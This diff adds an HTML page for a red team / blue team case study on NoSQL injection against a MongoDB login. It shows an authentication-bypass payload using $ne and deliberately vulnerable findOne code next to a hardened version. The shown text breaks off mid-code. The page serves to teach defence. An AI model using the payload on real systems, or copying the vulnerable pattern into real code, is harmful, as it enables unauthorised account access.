@@ -1,0 +1,1501 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NoSQL Injection — Red Team / Blue Team Case Study</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=JetBrains+Mono:wght@300;400;600;700&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+/* ───────────────────────────────── RESET & BASE ───────────────────────── */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:      #060912;
+  --bg2:     #0a1220;
+  --bg3:     #0e1a2d;
+  --card:    #0d1928;
+  --red:     #e53535;
+  --red-dim: #7a1c1c;
+  --red-glow:#ff4444;
+  --blue:    #1a7fe0;
+  --blue-dim:#0b3870;
+  --blue-glow:#4baeff;
+  --white:   #f0f4ff;
+  --muted:   #6b7fa0;
+  --border:  #152035;
+  --green:   #1dba6a;
+  --orange:  #f59e0b;
+  --mono:    'JetBrains Mono', monospace;
+  --sans:    'DM Sans', sans-serif;
+  --display: 'Bebas Neue', sans-serif;
+}
+html{scroll-behavior:smooth}
+body{
+  background:var(--bg);
+  color:var(--white);
+  font-family:var(--sans);
+  font-size:16px;
+  line-height:1.6;
+  overflow-x:hidden;
+}
+
+/* ───────────────────────────────── SCROLLBAR ──────────────────────────── */
+::-webkit-scrollbar{width:4px}
+::-webkit-scrollbar-track{background:var(--bg)}
+::-webkit-scrollbar-thumb{background:#1e3a5f;border-radius:2px}
+
+/* ───────────────────────────────── STICKY NAV ─────────────────────────── */
+nav{
+  position:fixed;top:0;left:0;right:0;z-index:100;
+  background:rgba(6,9,18,0.92);
+  backdrop-filter:blur(12px);
+  border-bottom:1px solid var(--border);
+  padding:0 2rem;
+  height:52px;
+  display:flex;align-items:center;justify-content:space-between;
+}
+.nav-brand{
+  font-family:var(--display);
+  font-size:1.3rem;
+  letter-spacing:0.08em;
+  display:flex;align-items:center;gap:0.6rem;
+}
+.nav-brand .dot-red{color:var(--red)}
+.nav-brand .dot-blue{color:var(--blue)}
+.nav-links{display:flex;gap:0.2rem}
+.nav-links a{
+  font-family:var(--mono);font-size:0.65rem;letter-spacing:0.1em;
+  color:var(--muted);text-decoration:none;
+  padding:0.3rem 0.7rem;border-radius:3px;
+  transition:all 0.2s;
+  text-transform:uppercase;
+}
+.nav-links a:hover,.nav-links a.active{color:var(--white);background:var(--border)}
+.nav-badge{
+  font-family:var(--mono);font-size:0.6rem;letter-spacing:0.12em;
+  background:var(--red-dim);color:var(--red-glow);
+  padding:0.25rem 0.7rem;border-radius:2px;
+  border:1px solid var(--red);
+}
+
+/* ───────────────────────────────── SECTION SHELL ──────────────────────── */
+section{padding:5rem 0;position:relative}
+.container{max-width:1100px;margin:0 auto;padding:0 2rem}
+.section-tag{
+  font-family:var(--mono);font-size:0.68rem;letter-spacing:0.2em;
+  text-transform:uppercase;margin-bottom:0.8rem;
+  display:inline-flex;align-items:center;gap:0.5rem;
+}
+.section-tag.red{color:var(--red)}
+.section-tag.blue{color:var(--blue)}
+.section-tag.neutral{color:var(--muted)}
+.section-tag::before{content:'';display:inline-block;width:20px;height:1px}
+.section-tag.red::before{background:var(--red)}
+.section-tag.blue::before{background:var(--blue)}
+.section-tag.neutral::before{background:var(--muted)}
+h2{
+  font-family:var(--display);font-size:clamp(2.2rem,4vw,3.2rem);
+  line-height:1;letter-spacing:0.04em;margin-bottom:1rem;
+}
+h3{font-family:var(--sans);font-size:1.1rem;font-weight:600;margin-bottom:0.5rem}
+p.lead{font-size:1.05rem;color:#a0b4cc;line-height:1.7;max-width:72ch}
+
+/* ───────────────────────────────── ANIMATE-IN ──────────────────────────── */
+.fade-up{opacity:0;transform:translateY(30px);transition:opacity 0.6s ease,transform 0.6s ease}
+.fade-up.visible{opacity:1;transform:none}
+.stagger-1{transition-delay:0.1s}
+.stagger-2{transition-delay:0.2s}
+.stagger-3{transition-delay:0.3s}
+.stagger-4{transition-delay:0.4s}
+.stagger-5{transition-delay:0.5s}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   HERO
+═══════════════════════════════════════════════════════════════════════════ */
+#hero{
+  min-height:100vh;display:flex;align-items:center;
+  background:var(--bg);
+  padding-top:52px;
+  position:relative;overflow:hidden;
+}
+.hero-grid{
+  display:grid;grid-template-columns:1fr 1fr;gap:0;
+  min-height:calc(100vh - 52px);
+}
+.hero-half{
+  display:flex;flex-direction:column;justify-content:center;
+  padding:4rem 3rem;
+}
+.hero-half.left{
+  background:radial-gradient(ellipse at 0% 50%, rgba(229,53,53,0.12) 0%, transparent 70%);
+  border-right:1px solid #1a0808;
+}
+.hero-half.right{
+  background:radial-gradient(ellipse at 100% 50%, rgba(26,127,224,0.12) 0%, transparent 70%);
+}
+.hero-label{
+  font-family:var(--mono);font-size:0.65rem;letter-spacing:0.25em;
+  text-transform:uppercase;margin-bottom:2rem;
+  display:flex;align-items:center;gap:0.8rem;
+}
+.hero-label::after{content:'';flex:1;height:1px;max-width:80px}
+.hero-label.red{color:var(--red)}.hero-label.red::after{background:var(--red)}
+.hero-label.blue{color:var(--blue-glow)}.hero-label.blue::after{background:var(--blue)}
+.hero-title-main{
+  font-family:var(--display);
+  font-size:clamp(3.5rem,7vw,5.5rem);
+  line-height:0.95;
+  letter-spacing:0.02em;
+  position:absolute;
+  left:50%;transform:translateX(-50%);
+  white-space:nowrap;
+  text-align:center;
+  z-index:10;
+  pointer-events:none;
+}
+.hero-center{
+  position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
+  text-align:center;z-index:10;pointer-events:none;
+}
+.hero-big-title{
+  font-family:var(--display);
+  font-size:clamp(3rem,6vw,5rem);
+  line-height:1;letter-spacing:0.04em;
+  text-shadow:0 0 60px rgba(255,255,255,0.15);
+}
+.hero-subtitle{
+  font-family:var(--mono);font-size:0.85rem;color:var(--muted);
+  letter-spacing:0.08em;margin-top:0.8rem;
+}
+.hero-divider{
+  position:absolute;top:0;left:50%;transform:translateX(-50%);
+  width:1px;height:100%;
+  background:linear-gradient(to bottom,transparent 0%,var(--red) 30%,var(--blue) 70%,transparent 100%);
+  opacity:0.4;
+}
+.hero-code-snippet{
+  font-family:var(--mono);font-size:0.8rem;line-height:2;
+  color:rgba(240,244,255,0.18);margin-top:3rem;
+}
+.hero-code-snippet span{color:rgba(229,53,53,0.35)}
+.hero-code-snippet.blue span{color:rgba(75,174,255,0.35)}
+.scroll-hint{
+  position:absolute;bottom:2rem;left:50%;transform:translateX(-50%);
+  font-family:var(--mono);font-size:0.65rem;color:var(--muted);
+  letter-spacing:0.15em;text-transform:uppercase;
+  display:flex;flex-direction:column;align-items:center;gap:0.5rem;animation:bob 2s ease-in-out infinite;
+}
+@keyframes bob{0%,100%{transform:translateX(-50%) translateY(0)}50%{transform:translateX(-50%) translateY(6px)}}
+.scroll-hint svg{width:16px;height:16px;opacity:0.5}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   SECTION 1 — WHAT IS NOSQL INJECTION
+═══════════════════════════════════════════════════════════════════════════ */
+#what{background:var(--bg)}
+.two-col{display:grid;grid-template-columns:1fr 1fr;gap:2.5rem;align-items:start;margin-top:2.5rem}
+.code-block{
+  background:var(--card);
+  border:1px solid var(--border);
+  border-radius:8px;
+  overflow:hidden;
+}
+.code-header{
+  background:#0a1525;
+  padding:0.6rem 1rem;
+  font-family:var(--mono);font-size:0.72rem;color:var(--muted);
+  display:flex;align-items:center;justify-content:space-between;
+  border-bottom:1px solid var(--border);
+}
+.code-header .dots{display:flex;gap:5px}
+.code-header .dots span{width:10px;height:10px;border-radius:50%}
+.code-header .dots .r{background:#ff5f57}
+.code-header .dots .y{background:#febc2e}
+.code-header .dots .g{background:#28c840}
+.code-header .lang{color:var(--muted)}
+code{display:block;padding:1.2rem 1.4rem;font-family:var(--mono);font-size:0.82rem;line-height:1.9;overflow-x:auto}
+.c-comment{color:#4a6080}
+.c-key{color:#7fb8f5}
+.c-op{color:#ff6b6b}
+.c-str{color:#a8e6a3}
+.c-fn{color:#ffd670}
+.c-val{color:#c9a9ff}
+.c-warn{color:#ff9944}
+.c-ok{color:#44ee88}
+.badge-vuln{
+  display:inline-flex;align-items:center;gap:0.4rem;
+  background:rgba(229,53,53,0.15);border:1px solid var(--red-dim);
+  color:var(--red-glow);border-radius:4px;
+  font-family:var(--mono);font-size:0.7rem;padding:0.3rem 0.7rem;
+  margin-bottom:1rem;
+}
+.badge-secure{
+  display:inline-flex;align-items:center;gap:0.4rem;
+  background:rgba(29,186,106,0.12);border:1px solid #1a6040;
+  color:var(--green);border-radius:4px;
+  font-family:var(--mono);font-size:0.7rem;padding:0.3rem 0.7rem;
+  margin-bottom:1rem;
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   SECTION 2 — ATTACK DISCOVERY
+═══════════════════════════════════════════════════════════════════════════ */
+#discovery{background:var(--bg2)}
+.discovery-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:1.5rem;margin-top:2.5rem}
+.disco-card{
+  background:var(--card);
+  border:1px solid var(--border);
+  border-radius:8px;padding:1.5rem;
+  position:relative;overflow:hidden;
+  transition:border-color 0.2s,transform 0.2s;
+}
+.disco-card:hover{border-color:var(--red-dim);transform:translateY(-3px)}
+.disco-card::before{
+  content:'';position:absolute;top:0;left:0;right:0;height:2px;
+  background:linear-gradient(90deg,var(--red),transparent);
+}
+.disco-num{
+  font-family:var(--display);font-size:2.5rem;color:var(--red);
+  line-height:1;margin-bottom:0.8rem;opacity:0.8;
+}
+.disco-card h3{color:var(--white);margin-bottom:0.5rem}
+.disco-card p{color:var(--muted);font-size:0.9rem;line-height:1.6}
+.endpoint-row{
+  margin-top:2rem;background:var(--card);border:1px solid var(--border);
+  border-radius:8px;padding:1.2rem 1.4rem;
+  font-family:var(--mono);font-size:0.8rem;
+  display:flex;flex-wrap:wrap;gap:0.5rem;
+}
+.ep{
+  padding:0.25rem 0.7rem;border-radius:4px;font-size:0.7rem;
+}
+.ep.post{background:rgba(229,53,53,0.15);color:#ff8888;border:1px solid #3a1010}
+.ep.get{background:rgba(26,127,224,0.15);color:#88aaff;border:1px solid #0a2040}
+.ep.put{background:rgba(245,158,11,0.15);color:#ffd080;border:1px solid #3a2a00}
+.ep.del{background:rgba(229,53,53,0.1);color:#ff6666;border:1px solid #2a0808}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   RED TEAM BANNER
+═══════════════════════════════════════════════════════════════════════════ */
+.team-banner{
+  padding:1.5rem 2rem;
+  display:flex;align-items:center;gap:1.5rem;
+}
+.team-banner.red{background:linear-gradient(135deg,#1a0000,#0c0000);border-top:2px solid var(--red);border-bottom:2px solid var(--red-dim)}
+.team-banner.blue{background:linear-gradient(135deg,#00001a,#00000c);border-top:2px solid var(--blue);border-bottom:2px solid var(--blue-dim)}
+.team-banner-label{
+  font-family:var(--display);font-size:2rem;letter-spacing:0.08em;
+}
+.team-banner.red .team-banner-label{color:var(--red)}
+.team-banner.blue .team-banner-label{color:var(--blue-glow)}
+.team-banner p{color:var(--muted);font-size:0.9rem}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   ATTACKS
+═══════════════════════════════════════════════════════════════════════════ */
+#attacks{background:var(--bg)}
+.attacks-grid{display:grid;grid-template-columns:1fr 1fr;gap:2rem;margin-top:2.5rem}
+.attack-card{
+  background:var(--card);border:1px solid var(--border);
+  border-radius:10px;overflow:hidden;
+  transition:border-color 0.2s,box-shadow 0.2s;
+}
+.attack-card:hover{border-color:var(--red-dim);box-shadow:0 0 30px rgba(229,53,53,0.08)}
+.attack-card-header{
+  background:#100808;padding:1rem 1.4rem;
+  border-bottom:1px solid #1a0808;
+  display:flex;align-items:center;gap:0.8rem;
+}
+.attack-num-badge{
+  font-family:var(--display);font-size:1.8rem;color:var(--red);opacity:0.8;
+  line-height:1;min-width:2rem;
+}
+.attack-card-header h3{color:var(--red-glow);font-size:1rem;margin:0}
+.attack-card-header .severity{
+  margin-left:auto;
+  font-family:var(--mono);font-size:0.65rem;letter-spacing:0.1em;
+  background:rgba(229,53,53,0.2);color:var(--red);
+  padding:0.2rem 0.5rem;border-radius:3px;border:1px solid var(--red-dim);
+}
+.attack-card-body{padding:1.2rem 1.4rem}
+.attack-card-body p{color:var(--muted);font-size:0.88rem;margin-bottom:1rem;line-height:1.6}
+.attack-card .code-block{margin-top:0.5rem}
+
+/* single wide card */
+.attack-card.wide{grid-column:1/-1}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   SVG DIAGRAM SECTIONS
+═══════════════════════════════════════════════════════════════════════════ */
+.diagram-wrap{
+  background:var(--card);border:1px solid var(--border);
+  border-radius:10px;padding:2rem;margin-top:2rem;
+  overflow:hidden;
+}
+.diagram-wrap svg{width:100%;height:auto;display:block}
+svg text{font-family:var(--mono)}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   BLUE TEAM
+═══════════════════════════════════════════════════════════════════════════ */
+#blueteam{background:var(--bg2)}
+.defense-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:1.5rem;margin-top:2.5rem}
+.def-card{
+  background:var(--card);border:1px solid var(--border);border-radius:10px;
+  overflow:hidden;transition:border-color 0.2s,transform 0.2s;
+}
+.def-card:hover{border-color:var(--blue-dim);transform:translateY(-3px)}
+.def-card-header{
+  background:#00061a;padding:1rem 1.4rem;
+  border-bottom:1px solid #0a1830;
+  display:flex;align-items:center;gap:0.8rem;
+}
+.def-id{
+  font-family:var(--display);font-size:1.8rem;color:var(--blue);opacity:0.9;
+  line-height:1;
+}
+.def-card-header h3{color:var(--blue-glow);font-size:0.95rem;margin:0;line-height:1.3}
+.def-card-body{padding:1.2rem 1.4rem}
+.def-card-body p{color:var(--muted);font-size:0.88rem;line-height:1.6;margin-bottom:1rem}
+.counters{display:flex;flex-wrap:wrap;gap:0.4rem;margin-bottom:0.8rem}
+.counter-tag{
+  font-family:var(--mono);font-size:0.65rem;
+  background:rgba(26,127,224,0.12);color:#88aaff;
+  border:1px solid #0a2040;padding:0.2rem 0.5rem;border-radius:3px;
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   BEFORE / AFTER TABLE
+═══════════════════════════════════════════════════════════════════════════ */
+#results{background:var(--bg)}
+.comparison-table{
+  width:100%;border-collapse:collapse;margin-top:2rem;
+  font-size:0.88rem;
+}
+.comparison-table th{
+  font-family:var(--mono);font-size:0.7rem;letter-spacing:0.12em;
+  text-transform:uppercase;color:var(--muted);
+  padding:0.8rem 1rem;text-align:left;
+  border-bottom:2px solid var(--border);
+}
+.comparison-table td{
+  padding:0.85rem 1rem;
+  border-bottom:1px solid var(--border);
+  vertical-align:middle;
+}
+.comparison-table tr:last-child td{border-bottom:none}
+.comparison-table .col-attack{color:var(--white);font-weight:500}
+.comparison-table .col-tech{color:var(--muted);font-family:var(--mono);font-size:0.78rem}
+.comparison-table .col-op{
+  font-family:var(--mono);font-size:0.78rem;
+  color:#c9a9ff;background:rgba(201,169,255,0.06);
+  padding:0.2rem 0.5rem;border-radius:3px;display:inline-block;
+}
+.col-before{color:#ff6666;font-family:var(--mono);font-size:0.78rem}
+.col-after{color:var(--green);font-family:var(--mono);font-size:0.78rem}
+.http-badge{
+  font-family:var(--mono);font-size:0.7rem;
+  padding:0.2rem 0.5rem;border-radius:3px;display:inline-block;
+}
+.http-400{background:rgba(229,53,53,0.15);color:#ff8888;border:1px solid #3a1010}
+.http-401{background:rgba(245,158,11,0.15);color:#ffd080;border:1px solid #3a2a00}
+.http-429{background:rgba(26,127,224,0.15);color:#88aaff;border:1px solid #0a2040}
+.check{color:var(--green)}
+.cross{color:var(--red)}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   CONCLUSION
+═══════════════════════════════════════════════════════════════════════════ */
+#conclusion{background:var(--bg2);padding:6rem 0}
+.conclusion-grid{display:grid;grid-template-columns:1fr 1fr;gap:3rem;margin-top:3rem}
+.conclusion-col h3{
+  font-family:var(--mono);font-size:0.7rem;letter-spacing:0.2em;
+  text-transform:uppercase;margin-bottom:1.5rem;
+  display:flex;align-items:center;gap:0.7rem;
+}
+.conclusion-col.red h3{color:var(--red)}
+.conclusion-col.red h3::before{content:'';display:block;width:18px;height:2px;background:var(--red)}
+.conclusion-col.blue h3{color:var(--blue-glow)}
+.conclusion-col.blue h3::before{content:'';display:block;width:18px;height:2px;background:var(--blue)}
+.takeaway-item{
+  display:flex;gap:1rem;align-items:flex-start;
+  padding:0.9rem 0;border-bottom:1px solid var(--border);
+}
+.takeaway-item:last-child{border-bottom:none}
+.takeaway-icon{flex-shrink:0;margin-top:2px}
+.takeaway-item p{color:#9ab0c8;font-size:0.9rem;line-height:1.5}
+.conclusion-footer{
+  margin-top:3rem;padding:1.5rem 2rem;
+  background:var(--card);border:1px solid var(--border);
+  border-radius:8px;text-align:center;
+  font-family:var(--mono);font-size:0.85rem;color:var(--muted);
+  line-height:1.7;
+}
+.conclusion-footer strong{color:var(--white)}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   FOOTER
+═══════════════════════════════════════════════════════════════════════════ */
+footer{
+  padding:2rem;text-align:center;
+  font-family:var(--mono);font-size:0.7rem;color:var(--muted);
+  border-top:1px solid var(--border);letter-spacing:0.06em;
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   RESPONSIVE
+═══════════════════════════════════════════════════════════════════════════ */
+@media(max-width:800px){
+  .hero-grid,.two-col,.attacks-grid,.defense-grid,.discovery-grid,.conclusion-grid{grid-template-columns:1fr}
+  .attack-card.wide{grid-column:1}
+  .hero-divider{display:none}
+  .hero-center{position:static;transform:none;padding:2rem}
+  nav .nav-links{display:none}
+  .hero-half{padding:2rem 1.5rem}
+}
+</style>
+</head>
+<body>
+
+<!-- ═══════════════════════════════ NAV ════════════════════════════════════ -->
+<nav>
+  <div class="nav-brand">
+    <span class="dot-red">●</span>NoSQL<span class="dot-blue">●</span>INJECTION
+  </div>
+  <div class="nav-links">
+    <a href="#what">Overview</a>
+    <a href="#discovery">Discovery</a>
+    <a href="#attacks">Red Team</a>
+    <a href="#blueteam">Blue Team</a>
+    <a href="#results">Results</a>
+    <a href="#conclusion">Summary</a>
+  </div>
+  <div class="nav-badge">⚠ EDUCATIONAL USE ONLY</div>
+</nav>
+
+<!-- ═══════════════════════════════ HERO ═══════════════════════════════════ -->
+<section id="hero">
+  <div class="hero-divider"></div>
+  <div class="hero-grid" style="width:100%">
+    <div class="hero-half left fade-up">
+      <div class="hero-label red">Red Team</div>
+      <div class="hero-code-snippet">
+        POST /api/auth/login<br>
+        {<br>
+        &nbsp;&nbsp;"username": "admin",<br>
+        &nbsp;&nbsp;"password": { <span>"$ne": ""</span> }<br>
+        }<br><br>
+        <span>→ 200 OK  // account compromised</span>
+      </div>
+      <div style="margin-top:3rem">
+        <div style="font-family:var(--mono);font-size:0.7rem;color:var(--muted);letter-spacing:0.12em;margin-bottom:0.5rem">OPERATORS USED</div>
+        <div style="display:flex;gap:0.5rem;flex-wrap:wrap">
+          <span style="font-family:var(--mono);font-size:0.75rem;background:rgba(229,53,53,0.15);color:#ff8888;padding:0.2rem 0.6rem;border-radius:3px;border:1px solid var(--red-dim)">$ne</span>
+          <span style="font-family:var(--mono);font-size:0.75rem;background:rgba(229,53,53,0.15);color:#ff8888;padding:0.2rem 0.6rem;border-radius:3px;border:1px solid var(--red-dim)">$gt</span>
+          <span style="font-family:var(--mono);font-size:0.75rem;background:rgba(229,53,53,0.15);color:#ff8888;padding:0.2rem 0.6rem;border-radius:3px;border:1px solid var(--red-dim)">$regex</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="hero-center">
+      <div class="hero-big-title">NoSQL<br>Injection</div>
+      <div class="hero-subtitle">Red Team · Blue Team Case Study</div>
+      <div style="margin-top:1.5rem;display:flex;align-items:center;gap:1rem;justify-content:center">
+        <span style="font-family:var(--mono);font-size:0.7rem;color:var(--muted)">Node.js</span>
+        <span style="color:var(--border)">·</span>
+        <span style="font-family:var(--mono);font-size:0.7rem;color:var(--muted)">MongoDB</span>
+        <span style="color:var(--border)">·</span>
+        <span style="font-family:var(--mono);font-size:0.7rem;color:var(--muted)">Express</span>
+      </div>
+    </div>
+
+    <div class="hero-half right fade-up stagger-2">
+      <div class="hero-label blue" style="text-align:right;justify-content:flex-end">Blue Team</div>
+      <div class="hero-code-snippet blue" style="text-align:right">
+        if (typeof password !== 'string') {<br>
+        &nbsp;&nbsp;return 400 // reject<br>
+        }<br>
+        bcrypt.compare(pwd, hash)<br>
+        rateLimit({ max: 10 })<br>
+        <span>→ All 6 attacks blocked</span>
+      </div>
+      <div style="margin-top:3rem;text-align:right">
+        <div style="font-family:var(--mono);font-size:0.7rem;color:var(--muted);letter-spacing:0.12em;margin-bottom:0.5rem">DEFENCES APPLIED</div>
+        <div style="display:flex;gap:0.5rem;flex-wrap:wrap;justify-content:flex-end">
+          <span style="font-family:var(--mono);font-size:0.75rem;background:rgba(26,127,224,0.15);color:#88aaff;padding:0.2rem 0.6rem;border-radius:3px;border:1px solid var(--blue-dim)">D1</span>
+          <span style="font-family:var(--mono);font-size:0.75rem;background:rgba(26,127,224,0.15);color:#88aaff;padding:0.2rem 0.6rem;border-radius:3px;border:1px solid var(--blue-dim)">D2</span>
+          <span style="font-family:var(--mono);font-size:0.75rem;background:rgba(26,127,224,0.15);color:#88aaff;padding:0.2rem 0.6rem;border-radius:3px;border:1px solid var(--blue-dim)">D3</span>
+          <span style="font-family:var(--mono);font-size:0.75rem;background:rgba(26,127,224,0.15);color:#88aaff;padding:0.2rem 0.6rem;border-radius:3px;border:1px solid var(--blue-dim)">D4</span>
+          <span style="font-family:var(--mono);font-size:0.75rem;background:rgba(26,127,224,0.15);color:#88aaff;padding:0.2rem 0.6rem;border-radius:3px;border:1px solid var(--blue-dim)">D5</span>
+          <span style="font-family:var(--mono);font-size:0.75rem;background:rgba(26,127,224,0.15);color:#88aaff;padding:0.2rem 0.6rem;border-radius:3px;border:1px solid var(--blue-dim)">D6</span>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="scroll-hint">
+    <span>scroll</span>
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 5v14M5 12l7 7 7-7"/></svg>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════ WHAT IS NOSQL INJECTION ════════════════ -->
+<section id="what">
+<div class="container">
+  <div class="section-tag neutral fade-up">01 — OVERVIEW</div>
+  <h2 class="fade-up stagger-1">What is NoSQL<br>Injection?</h2>
+  <p class="lead fade-up stagger-2">Unlike SQL injection which manipulates string-based queries, NoSQL injection sends <strong>JSON objects containing MongoDB operators</strong> as credentials. Because the server passes these objects directly to MongoDB, the database interprets them as query logic — not as literal strings.</p>
+
+  <!-- Attack flow SVG -->
+  <div class="diagram-wrap fade-up stagger-3">
+    <svg viewBox="0 0 1000 260" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <marker id="arr-red" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+          <path d="M0,0 L0,6 L8,3 z" fill="#e53535"/>
+        </marker>
+        <marker id="arr-gray" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+          <path d="M0,0 L0,6 L8,3 z" fill="#6b7fa0"/>
+        </marker>
+        <marker id="arr-green" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+          <path d="M0,0 L0,6 L8,3 z" fill="#1dba6a"/>
+        </marker>
+        <filter id="glow-red">
+          <feGaussianBlur stdDeviation="3" result="blur"/>
+          <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
+        </filter>
+      </defs>
+
+      <!-- Attacker node -->
+      <rect x="20" y="90" width="140" height="80" rx="6" fill="#1a0808" stroke="#e53535" stroke-width="1.5"/>
+      <text x="90" y="118" text-anchor="middle" fill="#6b7fa0" font-size="9" letter-spacing="1">ATTACKER</text>
+      <!-- Person icon SVG paths -->
+      <circle cx="90" cy="134" r="8" fill="none" stroke="#e53535" stroke-width="1.5"/>
+      <path d="M78 154 Q90 148 102 154" fill="none" stroke="#e53535" stroke-width="1.5" stroke-linecap="round"/>
+
+      <!-- Arrow 1 -->
+      <line x1="162" y1="130" x2="215" y2="130" stroke="#e53535" stroke-width="1.5" marker-end="url(#arr-red)"/>
+      <text x="188" y="120" text-anchor="middle" fill="#e53535" font-size="8">{"$ne":""}</text>
+
+      <!-- HTTP Request node -->
+      <rect x="218" y="90" width="160" height="80" rx="6" fill="#0d1928" stroke="#3a1a1a" stroke-width="1.5"/>
+      <text x="298" y="116" text-anchor="middle" fill="#6b7fa0" font-size="9" letter-spacing="1">HTTP REQUEST</text>
+      <!-- Envelope icon -->
+      <rect x="276" y="124" width="44" height="30" rx="3" fill="none" stroke="#ff6b6b" stroke-width="1.5"/>
+      <path d="M276 124 L298 142 L320 124" fill="none" stroke="#ff6b6b" stroke-width="1.5"/>
+      <!-- Payload label -->
+      <text x="298" y="162" text-anchor="middle" fill="#ff6b6b" font-size="8">POST /api/auth/login</text>
+
+      <!-- Arrow 2 -->
+      <line x1="380" y1="130" x2="433" y2="130" stroke="#e53535" stroke-width="1.5" marker-end="url(#arr-red)"/>
+      <text x="406" y="120" text-anchor="middle" fill="#6b7fa0" font-size="8">no type check</text>
+
+      <!-- Server node -->
+      <rect x="436" y="90" width="160" height="80" rx="6" fill="#0d1928" stroke="#3a1a1a" stroke-width="1.5"/>
+      <text x="516" y="116" text-anchor="middle" fill="#6b7fa0" font-size="9" letter-spacing="1">EXPRESS SERVER</text>
+      <!-- Server icon -->
+      <rect x="496" y="124" width="40" height="8" rx="2" fill="none" stroke="#e53535" stroke-width="1.5"/>
+      <rect x="496" y="136" width="40" height="8" rx="2" fill="none" stroke="#e53535" stroke-width="1.5"/>
+      <circle cx="502" cy="128" r="2" fill="#e53535"/>
+      <circle cx="502" cy="140" r="2" fill="#e53535"/>
+
+      <!-- Arrow 3 -->
+      <line x1="598" y1="130" x2="651" y2="130" stroke="#e53535" stroke-width="1.5" marker-end="url(#arr-red)"/>
+      <text x="624" y="118" text-anchor="middle" fill="#6b7fa0" font-size="8">raw object</text>
+      <text x="624" y="128" text-anchor="middle" fill="#ff4444" font-size="8">→ MongoDB</text>
+
+      <!-- MongoDB node -->
+      <rect x="654" y="70" width="160" height="120" rx="6" fill="#0d1928" stroke="#e53535" stroke-width="2" filter="url(#glow-red)"/>
+      <text x="734" y="96" text-anchor="middle" fill="#ff6b6b" font-size="9" letter-spacing="1">MONGODB</text>
+      <!-- Cylinder DB icon -->
+      <ellipse cx="734" cy="115" rx="28" ry="8" fill="none" stroke="#ff6b6b" stroke-width="1.5"/>
+      <line x1="706" y1="115" x2="706" y2="140" stroke="#ff6b6b" stroke-width="1.5"/>
+      <line x1="762" y1="115" x2="762" y2="140" stroke="#ff6b6b" stroke-width="1.5"/>
+      <ellipse cx="734" cy="140" rx="28" ry="8" fill="none" stroke="#ff6b6b" stroke-width="1.5"/>
+      <!-- Result text -->
+      <text x="734" y="164" text-anchor="middle" fill="#ff4444" font-size="8.5">findOne({password:{$ne:""}})</text>
+      <text x="734" y="178" text-anchor="middle" fill="#ff8888" font-size="8">→ MATCHES ANY USER!</text>
+
+      <!-- Arrow 4 — success -->
+      <path d="M814 130 Q900 130 900 60 Q900 30 734 30 Q600 30 500 50" fill="none" stroke="#e53535" stroke-width="1.5" stroke-dasharray="6 3" marker-end="url(#arr-red)"/>
+      <text x="850" y="25" text-anchor="middle" fill="#e53535" font-size="8">200 OK — token returned</text>
+
+      <!-- Labels at bottom -->
+      <text x="90" y="200" text-anchor="middle" fill="#4a6080" font-size="8">Malicious actor</text>
+      <text x="298" y="200" text-anchor="middle" fill="#4a6080" font-size="8">JSON payload</text>
+      <text x="516" y="200" text-anchor="middle" fill="#4a6080" font-size="8">No validation</text>
+      <text x="734" y="210" text-anchor="middle" fill="#4a6080" font-size="8">Operator executed</text>
+    </svg>
+  </div>
+
+  <div class="two-col" style="margin-top:2.5rem">
+    <div class="fade-up stagger-1">
+      <div class="badge-vuln">⚡ VULNERABLE</div>
+      <div class="code-block">
+        <div class="code-header">
+          <div class="dots"><span class="r"></span><span class="y"></span><span class="g"></span></div>
+          <span class="lang">auth.js — vulnerable login</span>
+        </div>
+        <code><span class="c-comment">// Input goes straight to MongoDB</span>
+<span class="c-fn">const</span> user = <span class="c-fn">await</span> User.<span class="c-fn">findOne</span>({
+  username: username,   <span class="c-comment">// ← attacker controls</span>
+  password: password    <span class="c-comment">// ← attacker controls</span>
+});
+
+<span class="c-comment">// When password = {"$ne":""}</span>
+<span class="c-comment">// MongoDB runs:</span>
+<span class="c-comment">// WHERE password != ""</span>
+<span class="c-warn">// → matches ANY real password!</span></code>
+      </div>
+    </div>
+    <div class="fade-up stagger-2">
+      <div class="badge-secure">✓ SECURE</div>
+      <div class="code-block">
+        <div class="code-header">
+          <div class="dots"><span class="r"></span><span class="y"></span><span class="g"></span></div>
+          <span class="lang">auth.js — secured login</span>
+        </div>
+        <code><span class="c-comment">// D1: reject non-strings first</span>
+<span class="c-fn">if</span> (<span class="c-fn">typeof</span> username !== <span class="c-str">'string'</span>
+    || <span class="c-fn">typeof</span> password !== <span class="c-str">'string'</span>) {
+  <span class="c-fn">return</span> res.<span class="c-fn">status</span>(<span class="c-val">400</span>).<span class="c-fn">json</span>({
+    message: <span class="c-str">'Invalid input'</span>
+  });
+}
+<span class="c-comment">// D3: bcrypt defeats $regex</span>
+<span class="c-fn">const</span> ok = <span class="c-fn">await</span> bcrypt.<span class="c-fn">compare</span>(
+  password, user.password
+);
